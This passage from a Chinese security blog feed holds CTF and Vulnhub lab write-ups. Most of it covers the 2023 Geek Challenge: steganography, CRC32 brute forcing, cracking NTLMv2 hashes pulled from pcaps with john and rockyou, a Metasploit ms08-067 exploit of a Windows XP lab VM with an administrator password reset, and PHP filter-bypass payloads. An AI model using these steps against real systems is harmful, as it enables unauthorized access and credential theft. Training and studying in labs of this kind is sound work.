title="总结"></a>总结</h2><p>1.sql注入联合查询获取网站后台登陆密码</p><p>2.命令注入反弹shell</p><p>3.exim4提权</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;vulnhub靶场DC-8&quot;&gt;&lt;a href=&quot;#vulnhub靶场DC-8&quot; class=&quot;headerlink&quot; title=&quot;vulnhub靶场DC-8&quot;&gt;&lt;/a&gt;vulnhub靶场DC-8&lt;/h1&gt;&lt;h2 id=&quot;靶场描述&quot;&gt;&lt;a href=&quot;#靶场描述&quot;</summary>
      
    
    
    
    <category term="渗透" scheme="http://w3nx1z1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="打靶" scheme="http://w3nx1z1.github.io/tags/%E6%89%93%E9%9D%B6/"/>
    
  </entry>
  
  <entry>
    <title>2023极客大挑战</title>
    <link href="http://w3nx1z1.github.io/2024/04/01/2023%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/"/>
    <id>http://w3nx1z1.github.io/2024/04/01/2023%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/</id>
    <published>2024-04-01T08:26:09.619Z</published>
    <updated>2024-04-01T08:27:52.357Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2023极客大挑战"><a href="#2023极客大挑战" class="headerlink" title="2023极客大挑战"></a>2023极客大挑战</h1><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="DEATH-N0TE-图片放缩"><a href="#DEATH-N0TE-图片放缩" class="headerlink" title="DEATH_N0TE(图片放缩)"></a>DEATH_N0TE(图片放缩)</h3><p>题目说有两部分flag  且隐写信息极多 那就好说多了 直接考虑图片隐写</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310281318707.png" alt="image-20231028131843223"></p><p>使用010editor在图片尾找到一串字符 进行base解码</p><pre><code>&quot;你找到了一本《DEATH NOTE》，好奇心驱使你翻开这本笔记，你阅读了使用规则，但是你惊讶地发现刚才的规则之中唯独没有第10条...&quot;&quot;你再次去确认是否如此，笔记上的文字却仿佛活了起来，在你眼中不断地放大缩小，你闭上了双眼...&quot;&quot;原本黑色的文字一转变成血红色，诡异的画面还是出现于你的视网膜前，你决定不再纠结于遗失的规则，幻觉消失了...&quot;</code></pre><p>既然是png文件 在考虑一下lsb隐写 </p><p>一看这幅死样子 果然有问题</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310281309995.png" alt="image-20231028130932821"></p><p>提取一下信息 在r g b三通道的0位 又是一串base编码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404011626470.png" alt="image-20231028131028697"></p><p>解码 得到第一部分flag</p><pre><code>&quot;你继续观察手上漆黑色的笔记本，冷静下来的你发现了藏在封面最下边的一行小字:SYC&#123;D4@Th_N0t4_&quot;&quot;你浏览过整个笔记本，可惜全是空白页，其中有一页不知道被谁撕掉了，你最终还是翻到了缺失的那一页&quot;&quot;你用铅笔涂抹着后面一页，上面缓缓出现了遗失的痕迹...&quot;</code></pre><p>在观察lsb隐写的时候就会发现 图片表面好像是有水印一样 依稀能辨认出是什么字符</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310281315702.png" alt="image-20231028131506633"></p><p>猜测是一些奇怪字体的英文字母 结合是《死亡笔记》的大背景 搜索一下 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310281315573.png" alt="image-20231028131556530"></p><p>确认是哥特字体 找个对照图 <a href="https://tieba.baidu.com/p/1442714710">死亡笔记中哥特字体对照图 </a>  有一点要注意 原图下半部分颜色太亮 会影响水印的观察读取 使用ps将颜色调成全黑 就可以看清了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404011626468.png" alt="image-20231028131707893"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310281317951.png" alt="image-20231028131719892"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310281318686.png" alt="image-20231028131801643"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310281318512.png" alt="image-20231028131821465"></p><p>分成四部分来看 结果是 </p><pre><code>TkFNRV9vMnRha3VYWH0=</code></pre><p>看到后面有等号 鉴定为base64 解码</p><pre><code>NAME_o2takuXX&#125;</code></pre><p>现在两部分flag就全了</p><pre><code>SYC&#123;D4@Th_N0t4_NAME_o2takuXX&#125;</code></pre><p>但其实还是需要练习一下写脚本的能力</p><p>根据前面文字中的第10条放大缩小  猜测需要将原图片缩小10倍</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231202200110895.png" alt="image-20231202200110895"></p><p>查看原图片像素为(3300,1800) 那么缩小10倍就是(330,180)</p><p>写脚本</p><pre><code class="python">from PIL import Imageimg = Image.open(&quot;kamisama.png&quot;)size = img.sizesmall_size = (int(size[0] / 10), int(size[1] / 10))img_small = img.resize(small_size, Image.NEAREST)img_small.save(&quot;flag.png&quot;)</code></pre><p><font color='red'>这里要注意 要使用PIL库中缩放图片算法中的<code>NEAREST</code>模式</font></p><h3 id="DEATH-N1TE"><a href="#DEATH-N1TE" class="headerlink" title="DEATH_N1TE"></a>DEATH_N1TE</h3><p>第一部分看到动态图 一眼拼图 先把webp动态图转换为gif图<a href="https://cloudconvert.com/">webp转gif</a> 在分帧</p><p> 使用montage拼图 gaps恢复顺序</p><pre><code>montage ./*.png -tile 40x22 -geometry +0+0 flag.pnggaps --image=flag.png --generations=200 --size=48 --save</code></pre><p>拼的不是特别完美 但是可以看出是base64编码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404011626538.png" alt="image-20231103091126052"></p><p>拿到后半部分flag</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231103091207601.png" alt="image-20231103091207601"></p><pre><code>_14_Ki114R&#125;</code></pre><p>后面的音频 一听就是慢扫描电视 把后半部分提取出来</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404011626543.png" alt="image-20231103092040221"></p><p>使用工具将图片扫出来 得到第一部分flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404011626684.png" alt="image-20231103092106149"></p><pre><code>SYC&#123;H4xr0t0r</code></pre><h3 id="DEATH-N2TE-gif分帧-图片放缩-像素拼接"><a href="#DEATH-N2TE-gif分帧-图片放缩-像素拼接" class="headerlink" title="DEATH-N2TE(gif分帧 图片放缩 像素拼接)"></a>DEATH-N2TE(gif分帧 图片放缩 像素拼接)</h3><pre><code>&quot;你知道了真相，正带上《DEATH NOTE》准备逃离，恰好，Muscial发给你一个视频，并说:&quot; &quot;[这里记下了他的真名以及照片，请写在那本笔记上面，我和Arahat0都被他看见了真名...]&quot;。 </code></pre><p>观察视频 可以看到很明显的竖列白色像素条经过</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312031228556.png" alt="image-20231203122830104"></p><p>首先对图片进行分帧 找个软件就行 分出192张图片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312031217015.png" alt="image-20231203121724885"></p><p>和DEATH_N0TE一样 先写个脚本将这些图片缩小十倍 原图片每张是1920x1080 那缩小后就是192x108</p><pre><code class="python">from PIL import Imagefor i in range(1, 193):    img = Image.open(r&#39;E:\Desktop\比赛/2023极客大挑战\misc\DEATH_N2TE\out/frame_&#123;&#125;.png&#39;.format(i))    size_small = (192,108)    img_small = img.resize(size_small, Image.NEAREST)    img_small.save(r&quot;E:\Desktop\比赛/2023极客大挑战\misc\DEATH_N2TE\out\small\&#123;&#125;.png&quot;.format(i))</code></pre><p>然后在写脚本将这些像素点进行拼接即可</p><pre><code class="python">from PIL import Imageimg1 = Image.new(&quot;RGB&quot;, (192,108), 0)for i in range(1, 193):    img = Image.open(r&quot;E:\Desktop\比赛\2023极客大挑战\misc\DEATH_N2TE\out\small/&#123;&#125;.png&quot;.format(i))    img.convert(&quot;1&quot;)    for x in range(192):        if x+1 == i:            for y in range(108):                img1.putpixel((x,y),img.getpixel((x,y)))img1.save(&quot;flag.png&quot;)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312031936544.png" alt="image-20231203193625446"></p><h3 id="xqr-图片等比例放大缩小-图片异或"><a href="#xqr-图片等比例放大缩小-图片异或" class="headerlink" title="xqr(图片等比例放大缩小 图片异或)"></a>xqr(图片等比例放大缩小 图片异或)</h3><p>给了一张二维码 扫一下 是false flag</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231201203621826.png" alt="image-20231201203621826"></p><p>在这张二维码的后面 还有一个图片 提取出来</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231201204635440.png" alt="image-20231201204635440"></p><p>看起来也是一张二维码 但是没有四个定位点 猜测需要异或 wp中说直接放在ps中 使用差值模式就可以得到反向flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404011626867.png" alt="image-20231201205048854"></p><p>扫码就可以得到flag</p><p>这个方法有点抽象 这边使用另一个方法 通过观察发现 原图片像素为75x75 分离出来的图片像素是25x25 刚好是原图片的1&#x2F;3</p><p>写个脚本 先将分离出来的图片等比例放大到75x75的像素</p><pre><code class="python">from PIL import Imageimg_input = Image.open(&quot;1.png&quot;) # 打开图片size_origin = img_input.size    # 读取像素size_big = (int(size_origin[0]*3), int(size_origin[1]*3))  # 扩大像素img_big = img_input.resize(size_big, Image.LANCZOS) # 创建新图片 new_size = (75, 75)new_img = Image.new(&quot;RGBA&quot;, new_size, (255,255,255))  # 创建新画布position = ((new_size[0] - size_big[0]) // 2, (new_size[1] - size_big[1]) // 2) # 确保新图片在新画布中心new_img.paste(img_big, position)           # 将新图片放在新画布上new_img.save(&quot;0.png&quot;)  # 保存图片</code></pre><p>在写脚本 将两张图片异或</p><pre><code class="python">from PIL import Imageimport numpyimg1 = Image.open(&quot;0.png&quot;)img2 = Image.open(&quot;xqr.png&quot;)array1 = numpy.array(img1)array2 = numpy.array(img2)xor_result = numpy.bitwise_xor(array1, array2)  # 对两张图片的像素进行逐位异或result_img = Image.fromarray(xor_result)        # 从NumPy数组创建新图像result_img.save(&quot;flag.png&quot;)</code></pre><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231201215744925.png" alt="image-20231201215744925"></p><p>扫码即可</p><h3 id="extractme-压缩包crc32爆破"><a href="#extractme-压缩包crc32爆破" class="headerlink" title="extractme(压缩包crc32爆破)"></a>extractme(压缩包crc32爆破)</h3><p>打开压缩包</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404011626559.png" alt="image-20231202194137644"></p><p>发现每个文件都很小 且大小一样 给出了crc32校验值 想到crc32爆破</p><p>写个脚本 循环爆破一下</p><pre><code class="python">from binascii import crc32import stringcrc_values = [0x8712de1d, 0x06eacbd7, 0x20a8e291, 0x31ee3074, 0x77aacf7f, 0x35fb7c6c, 0xf978d5aa, 0x016f7a0b]char_set = string.printableflag = dict(zip(crc_values, [None]*len(crc_values)))  # 创建一个字典flag zip函数将两个列表中的元素一一配对 字典中的键是crc_values中的值 键对应的值是Nonefor a in char_set:    for b in char_set:        for c in char_set:            for d in char_set:                s = a + b + c + d                crc_result = crc32(bytes(s, &#39;ascii&#39;)) &amp; 0xffffffff  # 计算字符串s的crc32值                if crc_result in crc_values:                    print(s, hex(crc_result))                    flag[crc_result] = s        # 当crc_values的值和crc_result匹配上时 将字典flag中对应于CRC32值crc_result的项的值更新为字符串sprint(&#39;&#39;.join([str(_) for _ in flag.values()]))  # 使用列表推导式遍历 flag 字典的所有值 将每个值转化为字符串 使用join方法连接每个字符串形成一个单独的字符串# SYC&#123;_cR@ck_1s_Useful_sometime$_&#125;</code></pre><h3 id="ez-smilemo"><a href="#ez-smilemo" class="headerlink" title="ez_smilemo"></a>ez_smilemo</h3><p>没玩出来 看官方wp说搜一个可以打开<code>data.win</code>文件的工具  <a href="https://github.com/krzys-h/UndertaleModTool">UndertaleModTool</a></p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231202195600301.png" alt="image-20231202195600301"></p><p>下好后 使用Undertalemodtool打开data.win 直接搜索flag 可以找到一段关于flag的代码和flag的base64值</p><pre><code>c20xbGVfMXNfQF9uMWNlX2dAbWU=sm1le_1s_@_n1ce_g@me</code></pre><h3 id="窃听风云-有NTLMv2散列的pcap文件"><a href="#窃听风云-有NTLMv2散列的pcap文件" class="headerlink" title="窃听风云(有NTLMv2散列的pcap文件)"></a>窃听风云(有NTLMv2散列的pcap文件)</h3><pre><code>题目描述：Hacker捕获到了一段敌对公司的对话信息流量，你能从流量中分析出Jack的密码吗，flag为SYC&#123;password&#125;</code></pre><p>参考文章 <a href="https://zhuanlan.zhihu.com/p/52882041">9步从pcap文件中提取并破解 NTLMv2 哈希</a></p><p>首先 看到流量包中有http协议 先导出一下HTTP</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404011626998.png" alt="image-20231202204849122"></p><p>在其中一个chat.txt文件中找到线索</p><pre><code>Boss: Jack, what&#39;s the matter with you? This year in HW, the red team used a weak password to log in to your account again!Jack: Sorry boss, but the password I set is already very long.Boss: Among the clues provided by the referee, it is said that your password is in a dictionary called rockyou.txt.gzJack: Okay, I&#39;ll modify it as soon as possibleBoss: Wait, are you still using that password?Jack: Yes, what&#39;s wrong?Boss: Damn, someone overheard our conversation. Exit the chat room immediately!</code></pre><p>大概意思是要我们找到Jack设置的弱密码 这个密码在rockyou.txt这个字典中还出现过</p><p>那提到rockyou.txt 肯定要想到爆破哈希密码了 本题就是NTLMv2哈希密码</p><p>那我们直接跟着参考文章中的步骤一点点找</p><p>1.先过滤ntlmssp字段 获得身份验证的握手包</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231202210215044.png" alt="image-20231202210215044"></p><p>2.查找<code>NTLMSSP_AUTH</code>包  查看HTTP数据 看到用户名和域名</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404011626480.png" alt="image-20231202210435547"></p><pre><code>User name:jackHost name:CLIENT01</code></pre><p>3.找到NTProofStr字段和NTLMv2的响应部分</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231202213216475.png" alt="image-20231202213216475"></p><pre><code>ntlmssp.ntlmv2_response.ntproofstr：2d1d24572b15fe544043431c59965d30ntlmssp.ntlmv2_response：2d1d24572b15fe544043431c59965d300101000000000000040d962b02edd901e6994147d6a34af200000000020012005700490044004700450054004c004c004300010008004400430030003100040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0003002e0044004300300031002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0007000800040d962b02edd90106000400020000000800300030000000000000000000000000300000078cdc520910762267e40488b60032835c6a37604d1e9be3ecee58802fb5f9150a001000000000000000000000000000000000000900200048005400540050002f003100390032002e003100360038002e0030002e0031000000000000000000</code></pre><p>但是注意响应部分是以NTProofStr字段开头的 要将这部分删掉</p><p>4.过滤筛选出ntlmssp.ntlmserverchallenge 找到NTLM Server Challenge字段 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404011626943.png" alt="image-20231202213540576"></p><pre><code>NTLM Server Challenge: 2af71b5ca7246268</code></pre><p>5.写hash文件</p><pre><code>username::domain:ServerChallenge:NTproofstring:modifiedntlmv2responsejack::WIDGETLLC:2af71b5ca7246268:2d1d24572b15fe544043431c59965d30:0101000000000000040d962b02edd901e6994147d6a34af200000000020012005700490044004700450054004c004c004300010008004400430030003100040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0003002e0044004300300031002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0007000800040d962b02edd90106000400020000000800300030000000000000000000000000300000078cdc520910762267e40488b60032835c6a37604d1e9be3ecee58802fb5f9150a001000000000000000000000000000000000000900200048005400540050002f003100390032002e003100360038002e0030002e0031000000000000000000</code></pre><p>6.使用hashcat或者john爆破密码</p><pre><code>john --wordlist=rockyou.txt --user=jack hash.txt out.txtjohn hash.txt -show</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312031129995.png" alt="image-20231203112929933"></p><p>所以泄漏的密码为</p><pre><code>iamjackpassword</code></pre><h3 id="窃听风云v2"><a href="#窃听风云v2" class="headerlink" title="窃听风云v2"></a>窃听风云v2</h3><pre><code>题目描述：这次Hacker捕获到了Jack登录邮件系统的流量，你还能从流量中分析出Jack的密码吗，flag为SYC&#123;password&#125;</code></pre><p>考的还是ntlm的hash 但是是被base64加密之后的</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312031955240.png" alt="image-20231203195518193"></p><p>在服务端返回250和235代码之间的包是认证的过程 从这几个包里面找和上一道题一样的hash</p><p>题目说是邮件 找SMTP流量 SMTP11包是认证成功的包 在这里解base64</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312031953720.png" alt="image-20231203195350638"></p><p>和上题一样 开始找hash内容</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312032003432.png" alt="image-20231203200346363"></p><pre><code>username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response</code></pre><pre><code>username: jackdomain: WidgetLLC.Internal</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312032010206.png" alt="image-20231203201020167"></p><pre><code>NTLM Server Challenge: 3e3966c8cacd29f7</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312032010387.png" alt="image-20231203201052345"></p><pre><code>NTProofStr: ddd46fd8f78c262eae16918f66185497NTLMv2 Response: ddd46fd8f78c262eae16918f66185497010100000000000050fd26d235edd9011219408ccb8a364800000000020012005700490044004700450054004c004c0043000100100043004c00490045004e00540030003300040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c000300360043004c00490045004e005400300033002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c000700080050fd26d235edd90106000400020000000800300030000000000000000000000000300000c78e803920758ec5672c36696ee163f6a4e61c8b5463c247daef8571677995a40a001000000000000000000000000000000000000900200053004d00540050002f0075006e007300700065006300690066006900650064000000000000000000</code></pre><p>合在一起</p><pre><code>jack::WidgetLLC.Internal:3e3966c8cacd29f7:ddd46fd8f78c262eae16918f66185497:010100000000000050fd26d235edd9011219408ccb8a364800000000020012005700490044004700450054004c004c0043000100100043004c00490045004e00540030003300040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c000300360043004c00490045004e005400300033002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c000700080050fd26d235edd90106000400020000000800300030000000000000000000000000300000c78e803920758ec5672c36696ee163f6a4e61c8b5463c247daef8571677995a40a001000000000000000000000000000000000000900200053004d00540050002f0075006e007300700065006300690066006900650064000000000000000000</code></pre><pre><code>john --wordlist=rockyou.txt hash1.txt out.txtjohn hash1.txt --show</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312032018282.png" alt="image-20231203201818216"></p><pre><code>jack100589barney</code></pre><p><a href="https://r0fus0d.blog.ffffffff0x.com/post/windows-authenticate/#ntlmv2">windows认证</a></p><h3 id="时代的眼泪"><a href="#时代的眼泪" class="headerlink" title="时代的眼泪"></a>时代的眼泪</h3><p>非预期解是直接解压vmdk文件 在文件中找 flag就在桌面壁纸中</p><pre><code>Tears_of_the_times-disk1.vmdk\Documents and Settings\Administrator\Local Settings\Application Data\Microsoft\Wallpaper1.bmp</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312022317301.png" alt="image-20231202231748947"></p><p>预期解就是小小的渗透一下</p><p>首先点击<code>Tears of the times.ovf</code> 将虚拟机导入vmware中 但是发现需要密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312022324569.png" alt="image-20231202232444471"></p><p>使用kali攻击机 先扫一下靶机的ip</p><pre><code>nmap 192.168.160.0/24</code></pre><p>扫出是<code>192.168.160.154</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312022325444.png" alt="image-20231202232525386"></p><p>在进一步扫一下开放的端口</p><pre><code>nmap -T4 -sC -sV 192.168.160.154</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312022326081.png" alt="image-20231202232625013"></p><p>也进一步证明了 我们扫出来的ip就是靶机ip</p><p>找一下windows xp系统经典漏洞</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312022332287.png" alt="image-20231202233209226"></p><p>里面提到的是<code>ms08-067</code>漏洞</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312022332564.png" alt="image-20231202233255495"></p><p>就找这个漏洞</p><pre><code>search ms08_067</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312022335590.png" alt="image-20231202233538548"></p><pre><code>use 0set RHOST 192.168.160.154run shell</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312022337221.png" alt="image-20231202233737168"></p><p>拿到shell之后 直接修改Administrator用户的密码</p><pre><code>net user administrator 123456</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312022339217.png" alt="image-20231202233911179"></p><p>修改完毕 直接登陆 直接在桌面上看到flag了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404011626409.png" alt="image-20231202234000689"></p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="EzHttp"><a href="#EzHttp" class="headerlink" title="EzHttp"></a>EzHttp</h3><p>需要使用post传入username和password 随便传一个 然后抓包</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310281624351.png" alt="image-20231028162430309"></p><p>想到<code>robots.txt</code> 访问一下 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310281626931.png" alt="image-20231028162605895"></p><p>在访问一下<code>/o2takuXX&#39;s_username_and_password.txt </code>得到username和password</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310281932950.png" alt="image-20231028193242789"></p><p>使用正确的账号密码进行登陆 是对http请求头进行操作 分别是</p><pre><code>必须来源自sycsec.com请使用Syclover浏览器请使用Syc.vip代理</code></pre><p>对http请求头进行修改 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310282131987.png" alt="image-20231028213106688"></p><p>对于最后一步</p><pre><code class="php">&lt;?phpif($_SERVER[&#39;HTTP_O2TAKUXX&#39;]==&quot;GiveMeFlag&quot;)&#123;    echo $flag;&#125;?&gt;</code></pre><p>就是要求http请求头中的<code>O2TAKUXX</code>字段的值要为<code>GiveMeFlag </code> 这里要注意在php中 所有http请求头中的内容前都会有<code>HTTP_</code>前缀 所以我们真实需要在http请求头中上传的参数是<code>O2TAKUXX</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310282150349.png" alt="image-20231028215029154"></p><h3 id="easy-php-php绕过"><a href="#easy-php-php绕过" class="headerlink" title="easy_php(php绕过)"></a>easy_php(php绕过)</h3><pre><code class="php">&lt;?phpheader(&#39;Content-type:text/html;charset=utf-8&#39;);error_reporting(0);highlight_file(__FILE__);include_once(&#39;flag.php&#39;);if(isset($_GET[&#39;syc&#39;])&amp;&amp;preg_match(&#39;/^Welcome to GEEK 2023!$/i&#39;, $_GET[&#39;syc&#39;]) &amp;&amp; $_GET[&#39;syc&#39;] !== &#39;Welcome to GEEK 2023!&#39;) &#123;    if (intval($_GET[&#39;lover&#39;]) &lt; 2023 &amp;&amp; intval($_GET[&#39;lover&#39;] + 1) &gt; 2024) &#123;        if (isset($_POST[&#39;qw&#39;]) &amp;&amp; $_POST[&#39;yxx&#39;]) &#123;            $array1 = (string)$_POST[&#39;qw&#39;];            $array2 = (string)$_POST[&#39;yxx&#39;];            if (sha1($array1) === sha1($array2)) &#123;                if (isset($_POST[&#39;SYC_GEEK.2023&#39;])&amp;&amp;($_POST[&#39;SYC_GEEK.2023&#39;]=&quot;Happy to see you!&quot;)) &#123;                    echo $flag;                &#125; else &#123;                    echo &quot;再绕最后一步吧&quot;;                &#125;            &#125; else &#123;                echo &quot;好哩，快拿到flag啦&quot;;            &#125;        &#125; else &#123;            echo &quot;这里绕不过去，QW可不答应了哈&quot;;        &#125;    &#125; else &#123;        echo &quot;嘿嘿嘿，你别急啊&quot;;    &#125;&#125;else &#123;    echo &quot;不会吧不会吧，不会第一步就卡住了吧，yxx会瞧不起你的！&quot;;&#125;?&gt; </code></pre><p>第一步  </p><pre><code>preg_match(&#39;/^Welcome to GEEK 2023!$/i&#39;, $_GET[&#39;syc&#39;])：这部分使用正则表达式来检查&#39;syc&#39;参数的值是否匹配模式&#39;/^Welcome to GEEK 2023!$/i&#39;。正则表达式中的&#39;i&#39;表示不区分大小写，也就是说，它会匹配值为&quot;Welcome to GEEK 2023!&quot;的任何大小写形式。$_GET[&#39;syc&#39;] !== &#39;Welcome to GEEK 2023!&#39;是检查syc的值 需要完全不等于Welcome to GEEK 2023!因为preg_match的判断中不区分大小写 因此一个大小写绕过就行</code></pre><pre><code>?syc=wELCOME TO geek 2023!</code></pre><p>第二步</p><pre><code>intval()函数将参数的内容转化为整数 要求lover中的值小于2023但是加一之后大于2024根据intval()函数的使用方法，当函数中用字符串方式表示科学计数法时，函数的返回值是科学计数法前面的一个数，而对于科学计数法加数字则会返回科学计数法的数值 因此使用科学计数法绕过即可</code></pre><pre><code>&amp;lover=1e6</code></pre><p>第三步</p><pre><code>上传两个参数qw和yxx 再将两个参数的值转化为字符串 传入array1和array2两个参数中非常简单 随便传</code></pre><p>第四步</p><pre><code>要求被赋值后的array1和array2经过sha1加密计算后的值相等在传入qw和yxx时 值相等即可</code></pre><pre><code>qw=0e1&amp;yxx=0e1</code></pre><p>第五步</p><pre><code>参数中存在小数点 会将其转化为下划线所以传参之后的参数就不是题目中要求的参数名了php的非法传参 在前面使用中括号替换掉第一个下划线即可</code></pre><pre><code>&amp;SYC[GEEK.2023=Happy to see you!</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310291111005.png" alt="image-20231029111111902"></p><pre><code>SYC&#123;bgH2lFmnLIEkY1jIvl&#125; </code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2023极客大挑战&quot;&gt;&lt;a href=&quot;#2023极客大挑战&quot; class=&quot;headerlink&quot; title=&quot;2023极客大挑战&quot;&gt;&lt;/a&gt;2023极客大挑战&lt;/h1&gt;&lt;h2 id=&quot;misc&quot;&gt;&lt;a href=&quot;#misc&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="ctf" scheme="http://w3nx1z1.github.io/categories/ctf/"/>
    
    
    <category term="misc" scheme="http://w3nx1z1.github.io/tags/misc/"/>
    
    <category term="web" scheme="http://w3nx1z1.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场记录DC-7</title>
    <link href="http://w3nx1z1.github.io/2024/03/31/vulnhub%E9%9D%B6%E5%9C%BADC-7wp/"/>
    <id>http://w3nx1z1.github.io/2024/03/31/vulnhub%E9%9D%B6%E5%9C%BADC-7wp/</id>
    <published>2024-03-31T13:03:08.545Z</published>
    <updated>2024-03-31T13:04:52.609Z</updated>
    
    <content type="html"><![CDATA[<h1 id="vulnhub靶场DC-7"><a href="#vulnhub靶场DC-7" class="headerlink" title="vulnhub靶场DC-7"></a>vulnhub靶场DC-7</h1><h2 id="靶场描述"><a href="#靶场描述" class="headerlink" title="靶场描述"></a>靶场描述</h2><pre><code>DC-7 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.While this isn&#39;t an overly technical challenge, it isn&#39;t exactly easy.While it&#39;s kind of a logical progression from an earlier DC release (I won&#39;t tell you which one), there are some new concepts involved, but you will need to figure those out for yourself. :-) If you need to resort to brute forcing or dictionary attacks, you probably won&#39;t succeed.What you will need to do, is to think &quot;outside&quot; of the box.Waaaaaay &quot;outside&quot; of the box. :-)The ultimate goal of this challenge is to get root and to read the one and only flag.Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won&#39;t give you the answer, instead, I&#39;ll give you an idea about how to move forward.</code></pre><p>这一段靶场描述 给我们的提示是 爆破&#x2F;字典攻击&#x2F;跳出框框(可能涉及到一些非常规的手段)</p><h2 id="渗透靶场"><a href="#渗透靶场" class="headerlink" title="渗透靶场"></a>渗透靶场</h2><h3 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h3><p>先扫ip</p><pre><code>nmap 192.168.160.0/24</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403042127114.png" alt="image-20240304212705072"></p><p>ip为<code>192.168.160.128</code>开放了22端口和80端口</p><p>在扫描具体的端口</p><pre><code>nmap -A -p- -v 192.168.160.128</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403042129224.png" alt="image-20240304212919172"></p><pre><code>开放22端口 存在ssh服务 Openssh 版本7.4p1开放80端口 存在web服务 使用Apache中间件 